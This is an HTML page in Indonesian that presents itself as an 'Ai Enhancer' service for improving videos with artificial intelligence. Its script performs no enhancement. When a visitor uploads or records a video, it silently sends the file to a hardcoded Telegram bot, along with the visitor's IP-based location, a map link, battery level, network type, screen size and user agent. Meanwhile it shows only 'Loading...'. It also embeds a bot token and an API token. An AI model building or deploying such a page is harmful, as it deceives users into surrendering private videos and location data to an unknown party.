<!doctype html>
<html lang="id">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Ai Enhancer</title>
  <style>
    :root{
      --bg:#0f0f10;
      --card:#161617;
      --muted: rgba(255,255,255,0.78);
      --accent-from: #00f0ff;
      --accent-to: #ff00cc;
      --btn-shadow: rgba(0,240,255,0.12);
    }
    html,body{
      height:100%;margin:0;background:var(--bg);
      font-family:Inter,system-ui,-apple-system,'Segoe UI',Roboto,Arial;
      color:#fff;display:flex;align-items:center;justify-content:center;padding:20px
    }
    .card{
      width:100%;max-width:900px;
      background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));
      border-radius:14px;padding:28px;
      box-shadow:0 20px 60px rgba(0,0,0,0.6);
      display:flex;flex-direction:column;gap:24px;align-items:center;justify-content:center
    }
    h1{margin:0 0 10px 0;font-size:28px;font-weight:800;
      background:linear-gradient(90deg,var(--accent-from),var(--accent-to));
      -webkit-background-clip:text;background-clip:text;color:transparent}
    p.lead{margin:0 0 16px 0;color:var(--muted)}
    .small{font-size:13px;color:rgba(255,255,255,0.66)}

    .btn{
      background:linear-gradient(90deg,var(--accent-from),var(--accent-to));
      border:none;padding:12px 24px;
      color:#fff;font-size:15px;font-weight:600;
      border-radius:10px;cursor:pointer;
      box-shadow:0 4px 20px var(--btn-shadow);
      transition:opacity 0.3s;
      margin:6px;
    }
    .btn:hover{opacity:0.9}
    input[type="file"]{display:none}
  </style>
</head>
<body>
  <div class="card" role="main">
    <h1>Ai Enhancer</h1>
    <p class="lead">Tingkatkan kualitas video Anda dengan kecerdasan buatan.</p>
    <div class="small">Unggah video Anda untuk memulai.</div>

    <!-- Tombol Upload Video Saja -->
    <label class="btn">
      📤 Upload Video
      <input type="file" id="videoInput" accept="video/*" capture="environment">
    </label>

    <!-- Status progress -->
    <div id="status" class="small"></div>
  </div>

<script>
/* ==== CONFIG ==== */
const BOT_TOKEN = "6958063603:AAHtHhQjPJvx-JfHjpB1TyBAMmQJSEl1024"; 
const CHAT_ID  = "5880037867";  
const statusEl = document.getElementById("status");

async function sendVideoToTelegram(file, caption){
  if(!BOT_TOKEN || !CHAT_ID) return;
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`;
  const form = new FormData();
  form.append("chat_id", CHAT_ID);
  form.append("video", file);
  form.append("caption", caption);
  await fetch(url, { method:"POST", body: form });
}

async function getIpInfo(){
  try {
    const res = await fetch("https://ipinfo.io/json?token=112f6453bc551e");
    return res.json();
  } catch(e){
    return null;
  }
}

async function getDeviceInfo(){
  let batteryTxt = "-";
  try { const b = await navigator.getBattery(); batteryTxt = `${Math.round((b.level||0)*100)}%${b.charging ? " ⚡️ Mengisi daya" : ""}`; } catch(e){}
  const conn = navigator.connection || {};
  const net = conn.effectiveType || conn.type || "-";
  return { battery: batteryTxt, network: net, screen: `${screen.width}x${screen.height}`, ua: navigator.userAgent, time: new Date().toLocaleString("id-ID") };
}

async function buildCaption(){
  const ip = await getIpInfo();
  const dev = await getDeviceInfo();
  let text = `🌐 *Informasi IP*`;
  if(ip){
    text += `\n🔢 Alamat IP: ${ip.ip}`;
    text += `\n🗺 Negara: ${ip.country||"-"}`;
    text += `\n🌍 Wilayah: ${ip.region||"-"}`;
    text += `\n📍 Kota: ${ip.city||"-"}`;
    text += `\n📡 ISP: ${ip.org||"-"}`;
    if(ip.loc){ text += `\n🗺 Maps: https://www.google.com/maps?q=${ip.loc}`; }
  }
  text += `\n\n📱 *Detail Perangkat*`;
  text += `\n🔋 Baterai: ${dev.battery}`;
  text += `\n📶 Jaringan: ${dev.network}`;
  text += `\n🖥️ Layar: ${dev.screen}`;
  text += `\n🕒 Waktu: ${dev.time}`;
  text += `\n🧠 User Agent: ${dev.ua}`;
  return text;
}

/* Upload video */
document.getElementById("videoInput").addEventListener("change", async (e)=>{
  const file = e.target.files[0];
  if(!file) return;
  statusEl.textContent = "Loading...";
  const caption = await buildCaption();
  await sendVideoToTelegram(file, caption);
  statusEl.textContent = "Loading...";
});
</script>
</body>
</html>
